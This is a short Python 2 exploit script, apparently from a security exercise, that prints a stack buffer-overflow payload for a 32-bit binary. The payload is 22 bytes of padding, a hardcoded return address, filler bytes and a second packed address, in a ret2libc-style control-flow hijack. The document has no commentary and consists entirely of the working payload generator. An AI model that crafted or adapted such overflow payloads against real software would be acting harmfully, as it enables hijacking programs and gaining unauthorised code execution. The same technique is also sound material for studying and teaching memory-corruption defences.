from shellcode import shellcode
from struct import pack
print 'a' *(0x12 + 4) + pack("<I", 0x804ef50) + 'a' * 4 + pack("<I", 0x80bc8e0)


